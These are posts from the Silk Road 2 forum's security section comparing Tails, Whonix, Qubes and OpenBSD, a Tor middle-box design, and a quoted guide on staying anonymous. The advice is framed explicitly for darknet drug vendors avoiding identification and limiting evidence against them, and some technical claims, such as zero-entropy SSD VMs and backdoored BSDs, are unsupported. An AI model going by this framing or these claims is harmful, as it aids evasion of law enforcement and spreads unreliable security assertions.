No Grsec/PaX kernel patches. Why not? This is trivial in debian to set up, which is what tails is based on. Also they are inflating the OS to beyond security into their own complete distro. What the fuck, I don't need DVD codecs and video editing software, I just need secure comms.  For myself I use Openbsd in terminal only, no X, no bullshit, I use Emacs for most everything or lynx. The reason I use Openbsd is the priv seg they use is much better, even better than running an SELinux sandbox in Linux. The GrSec patches do what Openbsd has done for about a decade: protect memory execution. Yeah.. there's no MAC (mandatory access control) but you don't need it. The truth of operating system security is if you can hack the kernel then all your knob twiddling of MAC and other bullshit is utterly useless.   For vendors here Tails is good enough. Run it in a VM. Your host system should hopefully be GrSec protected linux of whatever distro configured to run guest hosts. On your host system you can tunnel all traffic through Jondonym, so nobody sees your Tor or i2p connections. This is all explained on their help pages: https://anonymous-proxy-servers.net/en/help/transocks.html  I don't trust Whonix. Remember this is an untouched, no entropy VM running Linux that already has PRNG problems with /dev/random. If your computer has SSD and nothing else moving around then it's outputting zero entropy when it assigns the ASLR and random PIDs on boot and encrypts the first Tor circuit. Whonix did not answer this problem. VMs do not provide true isolation whatsoever, the host can still see what's going on and anything that is priv escalated to host.   TL;DR If you have DDR3 memory, use Tails. If you are using Whonix you're a fool who could just run Tails in a VM and gain the same NAT protection (internal IP) without having an untouched virtual machine handing out zero entropy. ",""

"Silk Road 2 Forums","El Presidente","13747","2014-01-12T18:39:49","Darknet Machine & VirtualMachine OS's - Discussion, Questions & Recomendations","Discussion/Security","El Presidente is surprised that so many of your are happy to run TOR on your secure systems rather than use a bastion host. Rather than replay ourselves, here is the contents from our last post on the subject.  All we would add is that the middle box should have a read only file-system so that any potential compromise will have great difficulty achieving persistence. The PI has a number of limitations given the CPU architecture but on balance they are cheap and contain very little surplus hardware/firmware to exploit.  ---------------------  We have taken a slightly different approach with this in the past, one that provides a little additional security at the cost of a little usability. We provide it here for information - it may be useful for some.  The fundamental difference is that rather than transparently route all traffic from the secure box and into tor we only route explicitly defined traffic.   The Middle Box A simple TOR client dual-homed host, ideally on a physical host. It will have two network interfaces, a public interface which connects to the Internet (ideally through a NATting router or firewall) and a private interface. This system must be hardened because it will be able to establish arbitrary connections to the Internet. It will run TOR in client mode and will expose the SOCKS proxy to the private network only. Ideally it should be hard-coded to connect to trusted guard nodes, preferably ones that you either run or know to be safe. At the least the guard nodes should be local to you in network terms. This system should be configured to drop all inbound connections on the public interface regardless of any upstream firewalls. The system should also be configured to drop all traffic on and out on the private interface except inbound traffic to the local SOCKS proxy port (9050/tcp or similar). For good measure the middle box should also drop all outbound UDP traffic to the Internet.   The Private network This network exists purely between the middle box and the secure box.  Ideally this should be a simple cross-over cable which connects the two systems. Wireless is acceptable but the key thing is that the private network cannot route anywhere other then between the Middle and Secure boxes and it will be carrying plain-text, sensitive traffic and thus must be protected from eavesdropping. The private network must have no default gateway and no DNS.   The Secure Box The key tenet of this system is that it does not know where it is or have any way of finding out where it is. This system has a single network interface on the private network. Again, there must be no default gateway, no DNS nothing. Just a simple static IP address and no more. The local firewall (iptables) should be configured on this system to drop all inbound traffic and block all outbound traffic except outbound to the SOCKS port on the middle box. The browser on this system should be configured to use the SOCKS proxy on the middle box. If there is a requirement to use any other application other than the browser then it must explicitly be configured to use SOCKS or, failing that, executed using 'torsocks' which again will use the SOCKS proxy on the middle box. Ideally the hostname of this system should be 'computer' or 'server' and only one user should be configured called 'user', ensure the mac address of the system is modified from the hardware default at boot time - ideally randomized each boot. In terms of OS, anything that is non persistent is nearly always better such as TAILS. The systems should have no microphone, no camera, no GPS and ideally no wireless (wlan, bluetooth, GSM, etc). Nothing that allows it to interact with the real world in any way except via that SOCKS proxy.  When looking at the hardening of the secure box, imagine you are a bad guy somewhere who has gained unrestricted access to the system and ask yourself:  a) can you break out of it in any way that will cause you to generate network traffic that will not go through the SOCKS port and into TOR? if you can then something is wrong, rethink. b) can you extract anything from the system that provides IRL identity information - for instance address details that you might use to copy/paste into order forms? If you can find anything of value then something is wrong, rethink.  This model can be virtualized easily enough but at the cost of some security. If virtualized then make sure file sharing from guest to host is disabled, shared clipboards etc. The virtualization software should be configured to provide as much isolation between the guest and host systems as possible.  Our preferred setup for this is simple and uses a Rasberry PI as the middle box and an old laptop connected via a cross-over ethernet cable. The PI connects wirelessly to the local broadband router.

"Silk Road 2 Forums","jesusofrave","13747","2014-01-07T20:49:41","Darknet Machine & VirtualMachine OS's - Discussion, Questions & Recomendations","Discussion/Security","We've quoted this before, a piece by Astor (hope you are well out there).  We would advise if you are a vendor you do not publicise your exact setup... look at how they built a bit more of a profile of the lulzsec crew by knowing some of the equipment they used...  And... here it is:  In the wake of the Freedom Hosting exploit, I think we should reevaluate our threat model and update our security to better protect ourselves against the real threats that we face. So I wrote this guide in order to spark a conversation. It is by no means comprehensive. I only focus on technical security. Perhaps others can address shipping and financial security. I welcome feedback and would like these ideas to be critiqued and expanded.   As I was thinking about writing this guide, I decided to take a step back and ask a basic question: what are our goals? I've come up with two basic goals that we want to achieve with our technical security.  1. Avoid being identified. 2. Minimize the damage when we are identified.  You can think of these as our _guiding security principles_. If you have a technical security question, you may be able to arrive at an answer by asking yourself these questions:  1. Does using this technology increase or decrease the chances that I will be identified? 2. Does using this technology increase or decrease the damage (eg, the evidence that can be used against me) when I am identified?  Obviously, you will need to understand the underlying technology to answer these questions.  The rest of this guide explains the broad technological features that decrease the chances we are identified and that minimize the damage when we are identified. Towards the end I list specific technologies and evaluate them based on these features.  First, let me list the broad features that I have come up with, then I will explain them.  1. Simplicity 2. Trustworthiness 3. Minimal execution of untrusted code 4. Isolation 5. Encryption  To some extent, we've been focusing on the wrong things. I've predominantly been concerned with network layer attacks, or ""attacks on the Tor network"", but it seems clear to me now that application layer attacks are far more likely to identify us. The applications that we run over Tor are a much bigger attack surface than Tor itself. We can minimize our chances of being identified by securing the applications that we run over Tor. This observation informs the first four features that we desire.   ===Simplicity===  Short of not using computers at all, we can minimize threats against us by simplifying the technological tools that we use. A smaller code base is less likely to have bugs, including deanonymizing vulnerabilities. A simpler application is less likely to behave in unexpected and unwanted ways.  As an example, when the Tor Project evaluated the traces left behind by the browser bundle, they found 4 traces on Debian Squeeze, which uses the Gnome 2 desktop environment, and 25 traces on Windows 7. It's clear that Windows 7 is more complex and behaves in more unexpected ways than Gnome 2. Through its complexity alone, Windows 7 increases your attack surface, exposing  you to more potential threats. (Although there are other ways that Windows 7 makes you more vulnerable, too.) The traces left behind on Gnome 2 are easier to prevent than the traces left behind on Windows 7, so at least with regard to this specific threat, Gnome 2 is desirable over Windows 7.  So, when evaluating a new technological tool for simplicity, ask yourself these questions:  Is it more or less complex than the tool I'm currently using? Does it perform more or fewer (unnecessary) functions than the tool I'm currently using?   ===Trustworthiness===  We should favor technologies that are built by professionals or people with many years of experience rather than newbs. A glaring example of this is CryptoCat, which was developed by a well-intentioned hobbyist programmer, and has suffered severe criticism because of the many vulnerabilities that have been discovered.  We should favor technologies that are open source, have a large user base, and a long history of use, because they will be more thoroughly reviewed.  When evaluating a new technological tool for trustworthiness, ask yourself these questions:  Who wrote or built this tool? How much experience do they have? Is it open source, and how big is the community of users, reviewers, and contributors?   ===Minimal Execution of Untrusted Code===  The first two features assume the code is trusted but has potential unwanted problems. This feature assumes that as part of our routine activities, we may have to run arbitrary untrusted code. This is code that we can't evaluate in advance. The main place this happens is in the browser, through plug-ins and scripts.  You should completely avoid running untrusted code, if possible. Ask yourself these questions:  Are the features that it provides absolutely necessary? Are there alternatives that provide these features without requiring plug-ins or scripts?   ===Isolation===  Isolation is the separation of technological components with barriers. It minimizes the damage incurred by exploits, so if one component is exploited, other components are still protected. It may be your last line of defense against application layer exploits.  The two types of isolation are physical (or hardware based) and virtual (or software based). Physical isolation is more secure than virtual isolation, because software based barriers can themselves be exploited by malicious code. We should prefer physical isolation over virtual isolation over no isolation.  When evaluating virtual isolation tools, ask yourself the same questions about simplicity and trustworthiness. Does this virtualization technology perform unnecessary functions (like providing a shared clipboard)? How long has it been in development, and how thoroughly has it been reviewed? How many exploits have been found?   ===Encryption==  Encryption is one of two defenses we have to minimize the damage when we are identified. The more encryption you use, the better off you are. In an ideal world, all of your storage media would be encrypted, along with every email and PM that you send. The reason for this is because, when some emails are encrypted but others are not, an attacker can easily identify the interesting emails. He can learn who the interesting parties are that you communicate with because those will be the ones you send encrypted emails to (this is called metadata leakage). Interesting messages are lost in the noise when everything is encrypted.  The same goes for storage media encryption. If you store an encrypted file on an unencrypted hard drive, an adversary can trivially determine that all the good stuff is in that small file. But when you use full disk encryption, you have more plausible deniability as to whether the drive contains data that would be interesting to that adversary, because there are more reasons to encrypt an entire hard drive than a single file. Also, an adversary who bypasses your encryption would have to cull through more data to find the the stuff that is interesting to him.  Unfortunately, using encryption incurs a cost that the vast majority of people can't bare, so at a minimum, sensitive information should be encrypted.  On a related note, the other defense against damage is secure data erasure, but that takes time that you may not have. Encryption is preemptive secure data erasure. It's easier to destroy encrypted data, because you only have to destroy the encryption key to prevent an adversary from accessing the data.  Finally, I'd like to add a related non-technical feature.  ===Safe Behavior===  In some cases, the technology we use is only as safe as our behavior. Encryption is useless if your password is ""password"". Tor is useless if you tell someone your name. It may surprise you how little an adversary needs to know about you in order to uniquely identify you. Here are some basic rules to follow:  Don't tell anyone your name. (obv) Don't describe your appearance, or the appearance of any major possessions (car, house, etc.). Don't describe your family and friends. Don't tell anyone your location beyond a broad geographical area. Don't tell people where you will be traveling in advance (this includes festivals!). Don't reveal specific times and places where you lived or visited in the past. Don't discuss specific arrests, detentions, discharges, etc. Don't talk about your school, job, military service, or any organizations with official memberships. Don't talk about hospital visits.  In general, don't talk about anything that links you to an official record of your identity.   ===A List of Somewhat Secure Setups for Silk Road Users===  I should begin by pointing out that the features outlined above are not equally important. Physical isolation is probably the most useful and can protect you even when you run complex and untrusted code. In each of the setups below, I assume a fully updated browser / TBB with scripts and plug-ins disabled. Also, the term ""membership concealment"" means that someone watching your internet connection doesn't know you are using Tor. This is especially important for vendors. You can use bridges, but I've included extrajurisdictional VPNs as an added layer of security.  With that in mind, here is a descending list of secure setups for SR users.  Starting off, I present to you the most secure setup!  #1  A router with a VPN + an anonymizing middle box running Tor + a computer running Qubes OS.  Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment against local observers with VPN  Disadvantages: Qubes OS has a small user base and is not well tested, as far as I know.  #2  Anon middle box (or router with Tor) + Qubes OS  Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed  Disadvantages: Qubes OS has a small user base and is not well tested, no membership concealment  #3  VPN router + anon middle box + Linux OS  Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base if it's a major distro like Ubuntu or Debian  Disadvantages: no virtual isolation of applications from each other  #4  Anon middle box (or router with Tor) + Linux OS  Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base  Disadvantages: no virtual isolation of applications from each other, no membership concealment   #5  Qubes OS by itself.  Advantages: virtual isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment (possible? VPN may be run in VM)  Disadvantages: no physical isolation, not well tested  #6  Whonix on Linux host.  Advantages: virtual isolation of Tor from applications, full disk encryption (possible), membership concealment (possible, VPN can be run on host)  Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested  #7  Tails  Advantages: encryption and leaves no trace behind, system level exploits are erased after reboot, relatively well tested  Disadvantages: no physical isolation, no virtual isolation, no membership concealment, no persistent entry guards! (but can manually set bridges)    I consider the following to be INSECURE setups.  #8  Whonix on Windows host.  Advantages: virtual isolation, encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested, VMs are exposed to Windows malware!  #9  Linux OS  Advantages: full disk encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation  #10  Windows OS  Advantages: full disk encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation, the biggest target of malware and exploits!   Assuming there is general agreement about the order of this list, our goal is to configure our personal setups to be as high up on the list as possible.  Thanks for your attention, and again I welcome comments and criticism.",""

As for the multiple device configuration mentioned in this thread, that can be and easily achieved with using QubesOS as the Xen based operating system allows you to run each and every application you need on your system as if it was in its own virtual machine, this forces everything to stay separate within its own subnet and to stop it from ever leaving your computer if you wish it did not.

TorVM in QubesOS does exactly what Whonix-Gateway does and will do it better with the expense of less resources. Whonix also follows the TAILS Linux motion of trying to be an overall operating system for the general public and try to cover as much of an audience as they can in order to gain popularity. But it would not be hard for anyone to build their own version of Whonix or TAILS Linux minus all of the unneeded applications and would be able to slim down either to something that can fit on a CD. The only reason I even mention Whonix as a recommendation is because it is certainly a lot better to run Whonix on top of a Linux host than it would be to run Apple's OSX or Microsoft's Windows.  My own personal preference would be to run QubesOS from a USB on a laptop that has eight or more GB of RAM and a CPU with VT-d or VT-x enabled, with the same shut down procedure as TAILS Linux along with its hardened Debian as the template VM minus all unnecessary applications and each application being given its own template, then with the same idea Whonix has of using a Tor based routing OS by installing TorVM along with running TorBrowserBundle behind it.  Sadly there are a lot of problems with my preferred setup.    * X.org windows server has A LOT of security issues.    * QubesOS dom0 is run on Fedora18 which is now no longer being supported and updated.    * Default Qubes templates are Fedora18 based and same goes as above.    * There is no support from the Qubes community towards Debian.    * I will have to put in a lot of work to get my configuration to work as well as it should.    * Using VT-d or VT-x would mean using none open sourced hardware.  As for BSD and variants it has been publicly disclosed that there are some version out there containing open back doors along with others having their very own developers passing negative announcements onto the public saying that the system they support is compromised.

My initial impression is now to WAIT for them to update it to a newer version of Fedora so that 1) installing TOR will be much easier and also 2) the version of TOR used would be a newer, updated version.  As it stands now to run a torVM in Qubes, an (old) alpha version of tor must be used that is compatible with Fedora 18. Also, this requires tinkering with the repos or actually installing manually. Having just begun to play with Qubes, I do not know how to download the RPM and move it to the correct place/vm/template (wherever that is) and then install it.  I also looked at setting up VPN usage within Qubes. It seems easily doable, but I'm not sure how to setup the VPN script I run normally from terminal or the vpn file that comes from the vpn provider. It appears that the solution may be setting up a different vpnvm for EACH different VPN exit City/country/region I have available from my VPN provider.  In the short term, I could try running tails or whonix from Qubes after I get my vpnVM set up. The Fedora 18 limitation might still be a problem, though.  I think for now I will just play around with Qubes and get it's basic functionality down while waiting for the next updated version of Qubes to be released.

Bulletproof is a myth:  Among security people who are actually competent to do something like that, the entire concept of ""bulletproof"" is foreign to them.   Find me any smart security person who really *understands* anonymity, and what they'll tell you is that the best you can do is to try to balance a number of competing factors and hope you don't get unlucky.  2. ""Secure"" has a very short shelf life.   I have a helluva time keeping my own damned equipment patched correctly, and if I sold you something I'd put together, you would, too.   The more clever the security technology, the more work it is to babysit.  That's why Liberte Linux's last release was over a year ago.  Hardened Gentoo with grsecurity is fantastic.  It's also a pain to patch and maintain.   3. Monetizing anonymity rarely works:  Whenever you try to exchange your cash for more anonymity, you almost always end up with less anonymity than you started with.  4. Backdoors:  I could spend *years* typing in all the supremely evil things you could do to someone building them a darknet machine.  As I was typing this, I actually just spent about 10 minutes thinking through a number of them, and I still have this stupid grin on my face.  And I'm not even properly evil.  I think the future of darknet machines for the masses will continue along the lines of free, open-source options like Tails or Whonix, where you can follow a public ""recipe"" to install it yourself.  You're still trusting the Tails/Whonix/etc developers, but at least you know they're probably not picking on *you* in particular.    ","Quote from: B4B on January 12, 2014, 05:50:09 pmI think there is big money to be made on bulletproof Darknet machines.This.

It is still a great solution for preventing DNS leaks, proxy bypass by plugins and myriad other privacy leaks and security threats. Nobody is saying that it's the best solution. Certainly physical isolation is the best solution. But Whonix is a lot easier to setup than an anonymizing middle box.

Anybody can install VirtualBox and import to the two Whonix VMs.   So the practical question isn't what is the best overall solution, but what is the best solution that the most people can reasonably adopt.

"Silk Road 2 Forums","StratosGuppy","12274","2013-12-29T18:58:45","Downloading files and watching youtube videos through TOR?","Discussion/Security","Tor warns you when you go to download a file because you might have installed a download manager that doesn't download through tor. There are add-ons you can install in Firefox to control downloads and the Tor project can't know if those are safe or not.   If you haven't installed any download managers and your download is handled through the Tor browser your ip won't leak and you are secure.  If the pdf viewer in that link works with scripts turned off then it should be safe as it is basically the same as simply viewing a website.  Anything is possible but the chance of youtube adding harmful scripts on a video to deanonymise a user is very low. Videos on youtube are legal so I am not sure what good it would do them even if they did that and got your ip.   The only way I can see it being worth LE's time to setup something like that would be if they created a youtube video that wasn't public and then sent the link to a user of the forum by private message. Then they would wait till the video was viewed and use an exploit to get that users ip. They might do something like that for a large drug seller to try to get his ip but if someone is sending you a link to a youtube video by pm/pgp you have to ask your self wtf is going on? lol",""
